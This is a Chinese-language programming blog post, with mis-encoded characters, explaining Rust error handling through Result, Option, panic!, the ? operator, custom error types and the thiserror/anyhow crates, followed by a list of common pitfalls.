ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯<a href="https://juejin.cn/user/3280598428302727" target="_blank" title="https://juejin.cn/user/3280598428302727">åœŸè±†</a>ï¼Œæ¬¢è¿å…³æ³¨æˆ‘çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FWvuT_N3bwgTUicUOZXwW4g" target="_blank" title="https://mp.weixin.qq.com/s/WvuT_N3bwgTUicUOZXwW4g" ref="nofollow noopener noreferrer">å…¬ä¼—å·ï¼šåœŸè±†å­¦å‰ç«¯</a></p>
<h2 data-id="heading-0">Why - ä¸ºä»€ä¹ˆè¦è®¤çœŸå¯¹å¾…é”™è¯¯å¤„ç†?</h2>
<h3 data-id="heading-1">é”™è¯¯å¤„ç†çš„é‡è¦æ€§</h3>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æ­£åœ¨å¼€å‘ä¸€ä¸ªæ–‡ä»¶å¤„ç†ç¨‹åºã€‚åœ¨å…¶ä»–è¯­è¨€ä¸­ï¼Œä½ å¯èƒ½ä¼šè¿™æ ·å†™ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python é£æ ¼</span>
file = <span class="hljs-built_in">open</span>(<span class="hljs-string">"config.txt"</span>)  <span class="hljs-comment"># å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼ŸğŸ’¥</span>
data = file.read()
</code></pre>
<p>ç¨‹åºå¯èƒ½åœ¨ä»»ä½•æ—¶å€™å´©æºƒï¼Œç”¨æˆ·åªä¼šçœ‹åˆ°ä¸€ä¸ªéš¾çœ‹çš„é”™è¯¯å †æ ˆã€‚ä½†åœ¨ Rust ä¸­ï¼Œç¼–è¯‘å™¨ä¼šé€¼ç€ä½ é¢å¯¹ç°å®ï¼š<strong>"å˜¿ï¼æ–‡ä»¶å¯èƒ½ä¸å­˜åœ¨ï¼Œä½ æ‰“ç®—æ€ä¹ˆåŠï¼Ÿ"</strong></p>
<p>è¿™å°±æ˜¯ Rust çš„å“²å­¦ï¼š<strong>é”™è¯¯æ˜¯ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œä¸æ˜¯æ„å¤–ã€‚</strong></p>
<h3 data-id="heading-2">Rust çš„è®¾è®¡ç†å¿µ</h3>
<p>Rust é€šè¿‡ç±»å‹ç³»ç»Ÿå¼ºåˆ¶ä½ å¤„ç†é”™è¯¯ï¼Œè¿™æ„å‘³ç€ï¼š</p>
<ul>
<li>âœ… ç¼–è¯‘æ—¶å°±èƒ½å‘ç°æ½œåœ¨é—®é¢˜</li>
<li>âœ… ä»£ç æ›´åŠ å¯é å’Œå¯ç»´æŠ¤</li>
<li>âœ… ä¸ä¼šæœ‰"å¿˜è®°å¤„ç†é”™è¯¯"è¿™å›äº‹</li>
<li>âŒ ä½†éœ€è¦å†™æ›´å¤šä»£ç ï¼ˆå€¼å¾—çš„ï¼ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-3">What - Rust ä¸­çš„é”™è¯¯ç±»å‹</h2>
<h3 data-id="heading-4">1. å¯æ¢å¤é”™è¯¯ï¼š<code>Result&lt;T, E&gt;</code></h3>
<p><code>Result</code> æ˜¯ Rust é”™è¯¯å¤„ç†çš„æ ¸å¿ƒï¼Œå®ƒæ˜¯ä¸€ä¸ªæšä¸¾ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Result</span>&lt;T, E&gt; {
    <span class="hljs-title function_ invoke__">Ok</span>(T),   <span class="hljs-comment">// æˆåŠŸæ—¶åŒ…å«å€¼</span>
    <span class="hljs-title function_ invoke__">Err</span>(E),  <span class="hljs-comment">// å¤±è´¥æ—¶åŒ…å«é”™è¯¯</span>
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> é¢„æœŸå¯èƒ½ä¼šå¤±è´¥çš„æ“ä½œï¼Œå¦‚æ–‡ä»¶ I/Oã€ç½‘ç»œè¯·æ±‚ã€è§£ææ•°æ®ç­‰ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::fs::File;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">open_file</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;File, std::io::Error&gt; {
    File::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">"hello.txt"</span>)  <span class="hljs-comment">// è¿”å› Result</span>
}
</code></pre>
<h3 data-id="heading-5">2. å¯é€‰å€¼ï¼š<code>Option&lt;T&gt;</code></h3>
<p><code>Option</code> ç”¨äºè¡¨ç¤º"å¯èƒ½æœ‰å€¼ï¼Œä¹Ÿå¯èƒ½æ²¡æœ‰"ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Option</span>&lt;T&gt; {
    <span class="hljs-title function_ invoke__">Some</span>(T),  <span class="hljs-comment">// æœ‰å€¼</span>
    <span class="hljs-literal">None</span>,     <span class="hljs-comment">// æ²¡æœ‰å€¼</span>
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> å€¼å¯èƒ½ä¸å­˜åœ¨ï¼Œä½†è¿™ä¸ç®—é”™è¯¯ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">find_user</span>(id: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;User&gt; {
    <span class="hljs-comment">// ç”¨æˆ·ä¸å­˜åœ¨æ˜¯æ­£å¸¸æƒ…å†µï¼Œä¸æ˜¯é”™è¯¯</span>
    users.<span class="hljs-title function_ invoke__">get</span>(&amp;id).<span class="hljs-title function_ invoke__">cloned</span>()
}
</code></pre>
<p><strong>åŒºåˆ«è®°å¿†æ³•ï¼š</strong></p>
<ul>
<li><code>None</code> = "æ²¡æ‰¾åˆ°ï¼Œä½†è¿™å¾ˆæ­£å¸¸" ğŸ¤·</li>
<li><code>Err</code> = "å‡ºé—®é¢˜äº†ï¼Œéœ€è¦çŸ¥é“ä¸ºä»€ä¹ˆ" âš ï¸</li>
</ul>
<h3 data-id="heading-6">3. ä¸å¯æ¢å¤é”™è¯¯ï¼š<code>panic!</code></h3>
<p><code>panic!</code> ä¼šç«‹å³ç»ˆæ­¢ç¨‹åºï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">divide</span>(a: <span class="hljs-type">i32</span>, b: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> {
    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span> {
        <span class="hljs-built_in">panic!</span>(<span class="hljs-string">"é™¤æ•°ä¸èƒ½ä¸ºé›¶ï¼"</span>);  <span class="hljs-comment">// ç¨‹åºå´©æºƒ</span>
    }
    a / b
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>ç¨‹åºé‡åˆ°æ— æ³•ç»§ç»­çš„è‡´å‘½é”™è¯¯</li>
<li>å¼€å‘é˜¶æ®µå¿«é€ŸåŸå‹</li>
<li>ä¸åº”è¯¥å‘ç”Ÿçš„é€»è¾‘é”™è¯¯ï¼ˆç±»ä¼¼ assertï¼‰</li>
</ul>
<p>âš ï¸ <strong>æ³¨æ„ï¼š</strong> ç”Ÿäº§ä»£ç åº”è¯¥å°½é‡å°‘ç”¨ <code>panic!</code></p>
<hr/>
<h2 data-id="heading-7">How - å¦‚ä½•ä¼˜é›…åœ°å¤„ç†é”™è¯¯</h2>
<h3 data-id="heading-8">åŸºç¡€å¤„ç†æ–¹å¼</h3>
<h4 data-id="heading-9">1. <code>match</code> è¡¨è¾¾å¼ï¼ˆæœ€åŸºç¡€ï¼‰</h4>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::fs::File;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">file_result</span> = File::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">"hello.txt"</span>);
    
    <span class="hljs-keyword">match</span> file_result {
        <span class="hljs-title function_ invoke__">Ok</span>(file) =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æˆåŠŸæ‰“å¼€æ–‡ä»¶ï¼"</span>);
            <span class="hljs-comment">// ä½¿ç”¨ file</span>
        }
        <span class="hljs-title function_ invoke__">Err</span>(error) =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æ‰“å¼€æ–‡ä»¶å¤±è´¥: {}"</span>, error);
            <span class="hljs-comment">// å¤„ç†é”™è¯¯</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-10">2. <code>unwrap()</code> å’Œ <code>expect()</code>ï¼ˆå¿«é€Ÿä½†å±é™©ï¼‰</h4>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// unwrap: æˆåŠŸè¿”å›å€¼ï¼Œå¤±è´¥å°± panic</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">file</span> = File::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">"hello.txt"</span>).<span class="hljs-title function_ invoke__">unwrap</span>();

<span class="hljs-comment">// expect: å’Œ unwrap ä¸€æ ·ï¼Œä½†å¯ä»¥è‡ªå®šä¹‰ panic æ¶ˆæ¯</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">file</span> = File::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">"hello.txt"</span>)
    .<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">"æ— æ³•æ‰“å¼€ hello.txtï¼Œè¯·æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨"</span>);
</code></pre>
<p><strong>ä½•æ—¶ä½¿ç”¨ï¼Ÿ</strong></p>
<ul>
<li>âœ… å†™ç¤ºä¾‹ä»£ç æˆ–å¿«é€ŸåŸå‹</li>
<li>âœ… ä½  100% ç¡®å®šä¸ä¼šå¤±è´¥çš„æƒ…å†µ</li>
<li>âŒ ç”Ÿäº§ä»£ç ï¼ˆå‡ ä¹ä¸è¦ç”¨ï¼‰</li>
</ul>
<p><strong>è®°å¿†å£è¯€ï¼š</strong> <code>unwrap()</code> æ˜¯"æˆ‘å¾ˆè‡ªä¿¡ï¼Œä¸ä¼šå‡ºé”™"ï¼Œç”¨é”™äº†å°±æ˜¯"æ‰“è„¸ç°åœº" ğŸ˜…</p>
<h4 data-id="heading-11">3. <code>?</code> æ“ä½œç¬¦ï¼ˆæœ€ä¼˜é›…ï¼‰</h4>
<p><code>?</code> æ˜¯ Rust çš„è¯­æ³•ç³–ï¼Œè‡ªåŠ¨å¤„ç†é”™è¯¯ä¼ æ’­ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::fs::File;
<span class="hljs-keyword">use</span> std::io::{<span class="hljs-keyword">self</span>, Read};

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">read_username_from_file</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">String</span>, io::Error&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">file</span> = File::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">"username.txt"</span>)?;  <span class="hljs-comment">// å¦‚æœå¤±è´¥ï¼Œç›´æ¥è¿”å› Err</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">username</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>();
    file.<span class="hljs-title function_ invoke__">read_to_string</span>(&amp;<span class="hljs-keyword">mut</span> username)?;  <span class="hljs-comment">// åŒæ ·çš„é­”æ³•</span>
    <span class="hljs-title function_ invoke__">Ok</span>(username)  <span class="hljs-comment">// æˆåŠŸæ—¶è¿”å›</span>
}
</code></pre>
<p><strong><code>?</code> çš„å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// è¿™æ®µä»£ç ï¼š</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">file</span> = File::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">"hello.txt"</span>)?;

<span class="hljs-comment">// ç­‰ä»·äºï¼š</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">file</span> = <span class="hljs-keyword">match</span> File::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">"hello.txt"</span>) {
    <span class="hljs-title function_ invoke__">Ok</span>(f) =&gt; f,
    <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Err</span>(e),
};
</code></pre>
<p><strong>ä½¿ç”¨æ¡ä»¶ï¼š</strong></p>
<ul>
<li>å‡½æ•°å¿…é¡»è¿”å› <code>Result</code> æˆ– <code>Option</code></li>
<li>é”™è¯¯ç±»å‹å¿…é¡»èƒ½å¤Ÿè½¬æ¢ï¼ˆå®ç°äº† <code>From</code> traitï¼‰</li>
</ul>
<h3 data-id="heading-12">è¿›é˜¶æŠ€å·§</h3>
<h4 data-id="heading-13">1. é“¾å¼è°ƒç”¨</h4>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::fs;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">read_and_parse</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">i32</span>, <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> std::error::Error&gt;&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">content</span> = fs::<span class="hljs-title function_ invoke__">read_to_string</span>(<span class="hljs-string">"number.txt"</span>)?;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">number</span>: <span class="hljs-type">i32</span> = content.<span class="hljs-title function_ invoke__">trim</span>().<span class="hljs-title function_ invoke__">parse</span>()?;
    <span class="hljs-title function_ invoke__">Ok</span>(number)
}
</code></pre>
<h4 data-id="heading-14">2. ä½¿ç”¨ <code>and_then</code> å’Œ <code>map</code></h4>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_user_age</span>(id: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;<span class="hljs-type">u32</span>&gt; {
    <span class="hljs-title function_ invoke__">find_user</span>(id)
        .<span class="hljs-title function_ invoke__">map</span>(|user| user.age)  <span class="hljs-comment">// å¦‚æœæ‰¾åˆ°ç”¨æˆ·ï¼Œæå–å¹´é¾„</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process_file</span>(path: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">String</span>, io::Error&gt; {
    fs::<span class="hljs-title function_ invoke__">read_to_string</span>(path)
        .<span class="hljs-title function_ invoke__">and_then</span>(|content| {
            <span class="hljs-comment">// è¿›ä¸€æ­¥å¤„ç†</span>
            <span class="hljs-title function_ invoke__">Ok</span>(content.<span class="hljs-title function_ invoke__">to_uppercase</span>())
        })
}
</code></pre>
<h4 data-id="heading-15">3. æä¾›é»˜è®¤å€¼</h4>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// Option: ä½¿ç”¨ unwrap_or</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">user</span> = <span class="hljs-title function_ invoke__">find_user</span>(<span class="hljs-number">123</span>).<span class="hljs-title function_ invoke__">unwrap_or</span>(User::<span class="hljs-title function_ invoke__">default</span>());

<span class="hljs-comment">// Option: ä½¿ç”¨ unwrap_or_elseï¼ˆæƒ°æ€§æ±‚å€¼ï¼‰</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">user</span> = <span class="hljs-title function_ invoke__">find_user</span>(<span class="hljs-number">123</span>).<span class="hljs-title function_ invoke__">unwrap_or_else</span>(|| {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"ç”¨æˆ·ä¸å­˜åœ¨ï¼Œåˆ›å»ºé»˜è®¤ç”¨æˆ·"</span>);
    User::<span class="hljs-title function_ invoke__">default</span>()
});

<span class="hljs-comment">// Result: ä½¿ç”¨ unwrap_or_default</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">count</span>: <span class="hljs-type">i32</span> = <span class="hljs-title function_ invoke__">parse_number</span>(<span class="hljs-string">"abc"</span>).<span class="hljs-title function_ invoke__">unwrap_or_default</span>();  <span class="hljs-comment">// å¤±è´¥è¿”å› 0</span>
</code></pre>
<h4 data-id="heading-16">4. é”™è¯¯è½¬æ¢</h4>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::num::ParseIntError;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">double_number</span>(s: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">i32</span>, ParseIntError&gt; {
    s.parse::&lt;<span class="hljs-type">i32</span>&gt;()
        .<span class="hljs-title function_ invoke__">map</span>(|n| n * <span class="hljs-number">2</span>)  <span class="hljs-comment">// æˆåŠŸæ—¶è½¬æ¢å€¼ï¼Œé”™è¯¯ç±»å‹ä¸å˜</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-17">æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-18">1. è‡ªå®šä¹‰é”™è¯¯ç±»å‹</h3>
<p>å¯¹äºå¤æ‚é¡¹ç›®ï¼Œåˆ›å»ºè‡ªå·±çš„é”™è¯¯ç±»å‹ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::fmt;

<span class="hljs-meta">#[derive(Debug)]</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">AppError</span> {
    <span class="hljs-title function_ invoke__">IoError</span>(std::io::Error),
    <span class="hljs-title function_ invoke__">ParseError</span>(<span class="hljs-type">String</span>),
    <span class="hljs-title function_ invoke__">NotFound</span>(<span class="hljs-type">String</span>),
}

<span class="hljs-comment">// å®ç° Display trait</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">fmt</span>::Display <span class="hljs-keyword">for</span> <span class="hljs-title class_">AppError</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">fmt</span>(&amp;<span class="hljs-keyword">self</span>, f: &amp;<span class="hljs-keyword">mut</span> fmt::Formatter) <span class="hljs-punctuation">-&gt;</span> fmt::<span class="hljs-type">Result</span> {
        <span class="hljs-keyword">match</span> <span class="hljs-keyword">self</span> {
            AppError::<span class="hljs-title function_ invoke__">IoError</span>(e) =&gt; <span class="hljs-built_in">write!</span>(f, <span class="hljs-string">"IO é”™è¯¯: {}"</span>, e),
            AppError::<span class="hljs-title function_ invoke__">ParseError</span>(msg) =&gt; <span class="hljs-built_in">write!</span>(f, <span class="hljs-string">"è§£æé”™è¯¯: {}"</span>, msg),
            AppError::<span class="hljs-title function_ invoke__">NotFound</span>(item) =&gt; <span class="hljs-built_in">write!</span>(f, <span class="hljs-string">"æœªæ‰¾åˆ°: {}"</span>, item),
        }
    }
}

<span class="hljs-comment">// å®ç° Error trait</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">std</span>::error::Error <span class="hljs-keyword">for</span> <span class="hljs-title class_">AppError</span> {}

<span class="hljs-comment">// å®ç° From trait å…è®¸ä½¿ç”¨ ?</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">From</span>&lt;std::io::Error&gt; <span class="hljs-keyword">for</span> <span class="hljs-title class_">AppError</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">from</span>(error: std::io::Error) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        AppError::<span class="hljs-title function_ invoke__">IoError</span>(error)
    }
}

<span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰é”™è¯¯</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">load_config</span>(path: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;Config, AppError&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">content</span> = std::fs::<span class="hljs-title function_ invoke__">read_to_string</span>(path)?;  <span class="hljs-comment">// io::Error è‡ªåŠ¨è½¬æ¢</span>
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">config</span> = <span class="hljs-title function_ invoke__">parse_config</span>(&amp;content)
        .<span class="hljs-title function_ invoke__">map_err</span>(|e| AppError::<span class="hljs-title function_ invoke__">ParseError</span>(e))?;  <span class="hljs-comment">// æ‰‹åŠ¨è½¬æ¢</span>
    
    <span class="hljs-title function_ invoke__">Ok</span>(config)
}
</code></pre>
<h3 data-id="heading-19">2. ä½¿ç”¨ <code>thiserror</code> å’Œ <code>anyhow</code> crate</h3>
<p>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œæ¨èä½¿ç”¨è¿™ä¸¤ä¸ªåº“ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> thiserror::Error;

<span class="hljs-meta">#[derive(Error, Debug)]</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">DataError</span> {
    <span class="hljs-meta">#[error(<span class="hljs-string">"æ–‡ä»¶æœªæ‰¾åˆ°: {0}"</span>)]</span>
    <span class="hljs-title function_ invoke__">NotFound</span>(<span class="hljs-type">String</span>),
    
    <span class="hljs-meta">#[error(<span class="hljs-string">"è§£æå¤±è´¥: {0}"</span>)]</span>
    <span class="hljs-title function_ invoke__">ParseError</span>(<span class="hljs-type">String</span>),
    
    <span class="hljs-meta">#[error(<span class="hljs-string">"IO é”™è¯¯"</span>)]</span>
    <span class="hljs-title function_ invoke__">IoError</span>(<span class="hljs-meta">#[from]</span> std::io::Error),
}

<span class="hljs-comment">// ä½¿ç”¨ anyhow å¿«é€Ÿå¤„ç†é”™è¯¯</span>
<span class="hljs-keyword">use</span> anyhow::{<span class="hljs-type">Result</span>, Context};

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process_data</span>(path: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;Data&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">content</span> = std::fs::<span class="hljs-title function_ invoke__">read_to_string</span>(path)
        .<span class="hljs-title function_ invoke__">context</span>(<span class="hljs-string">"æ— æ³•è¯»å–æ•°æ®æ–‡ä»¶"</span>)?;
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">data</span> = <span class="hljs-title function_ invoke__">parse_data</span>(&amp;content)
        .<span class="hljs-title function_ invoke__">context</span>(<span class="hljs-string">"æ•°æ®æ ¼å¼ä¸æ­£ç¡®"</span>)?;
    
    <span class="hljs-title function_ invoke__">Ok</span>(data)
}
</code></pre>
<h3 data-id="heading-20">3. ä½•æ—¶ä½¿ç”¨ä½•ç§é”™è¯¯å¤„ç†</h3>



































<table><thead><tr><th>åœºæ™¯</th><th>ä½¿ç”¨</th><th>åŸå› </th></tr></thead><tbody><tr><td>åº“ä»£ç </td><td><code>Result</code></td><td>è®©è°ƒç”¨è€…å†³å®šå¦‚ä½•å¤„ç†</td></tr><tr><td>åº”ç”¨ç¨‹åºä¸»é€»è¾‘</td><td><code>Result</code></td><td>ç®€åŒ–é”™è¯¯ä¼ æ’­</td></tr><tr><td>ç¤ºä¾‹/æµ‹è¯•ä»£ç </td><td><code>unwrap()</code>/<code>expect()</code></td><td>å¿«é€Ÿå¼€å‘</td></tr><tr><td>å€¼å¯èƒ½ä¸å­˜åœ¨</td><td><code>Option</code></td><td>ä¸æ˜¯é”™è¯¯ï¼Œåªæ˜¯æ²¡æœ‰</td></tr><tr><td>é€»è¾‘é”™è¯¯</td><td><code>panic!</code></td><td>ä¸åº”è¯¥å‘ç”Ÿ</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-21">å¸¸è§è¯¯åŒºä¸é™·é˜±</h2>
<h3 data-id="heading-22">âŒ è¯¯åŒº 1ï¼šæ»¥ç”¨ <code>unwrap()</code></h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ä¸å¥½ - å¯èƒ½å¯¼è‡´ panic</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">file</span> = File::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">"config.txt"</span>).<span class="hljs-title function_ invoke__">unwrap</span>();
</code></pre>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// å¥½ - ä¼˜é›…å¤„ç†é”™è¯¯</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">file</span> = File::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">"config.txt"</span>)
    .<span class="hljs-title function_ invoke__">map_err</span>(|e| {
        eprintln!(<span class="hljs-string">"æ— æ³•æ‰“å¼€é…ç½®æ–‡ä»¶: {}"</span>, e);
        std::process::<span class="hljs-title function_ invoke__">exit</span>(<span class="hljs-number">1</span>);
    })
    .<span class="hljs-title function_ invoke__">unwrap</span>();

<span class="hljs-comment">// æ›´å¥½ - è¿”å› Result</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">load_config</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;Config, io::Error&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">file</span> = File::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">"config.txt"</span>)?;
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-23">âŒ è¯¯åŒº 2ï¼šå¿½ç•¥é”™è¯¯</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ä¸å¥½ - é”™è¯¯è¢«å¿½ç•¥</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">_</span> = std::fs::<span class="hljs-title function_ invoke__">remove_file</span>(<span class="hljs-string">"temp.txt"</span>);
</code></pre>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// å¥½ - è‡³å°‘è®°å½•é”™è¯¯</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Err</span>(e) = std::fs::<span class="hljs-title function_ invoke__">remove_file</span>(<span class="hljs-string">"temp.txt"</span>) {
    eprintln!(<span class="hljs-string">"è­¦å‘Šï¼šæ— æ³•åˆ é™¤ä¸´æ—¶æ–‡ä»¶: {}"</span>, e);
}
</code></pre>
<h3 data-id="heading-24">âŒ è¯¯åŒº 3ï¼šè¿‡æ—©ä½¿ç”¨ <code>?</code></h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ä¸å¥½ - é”™è¯¯ä¿¡æ¯ä¸æ˜ç¡®</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> Error&gt;&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">data</span> = <span class="hljs-title function_ invoke__">read_file</span>(<span class="hljs-string">"data.txt"</span>)?;  <span class="hljs-comment">// å“ªé‡Œå‡ºé”™äº†ï¼Ÿ</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">parsed</span> = <span class="hljs-title function_ invoke__">parse_data</span>(&amp;data)?;    <span class="hljs-comment">// è¿˜æ˜¯è¿™é‡Œï¼Ÿ</span>
    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// å¥½ - æ·»åŠ ä¸Šä¸‹æ–‡</span>
